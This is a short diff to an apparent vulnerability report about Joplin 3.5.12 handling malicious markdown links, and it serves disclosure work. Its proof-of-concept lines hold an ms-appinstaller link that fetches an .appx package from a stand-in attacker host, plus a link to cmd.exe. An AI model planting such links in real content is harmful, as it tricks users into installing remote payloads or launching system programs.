@@ -5,7 +5,7 @@ Joplin latest version (3.5.12) has a vulnerability when handling markdown malici
 
 Proof of Concept:
 
-Link: ms-appinstaller://?source=https://www.evilpayload.com.br/xxx.appx
+Link: ms-appinstaller://?source=`https://www.evilpayload.com.br/xxx.appx`
 
 Link: c:/windows/system32/cmd.exe
 
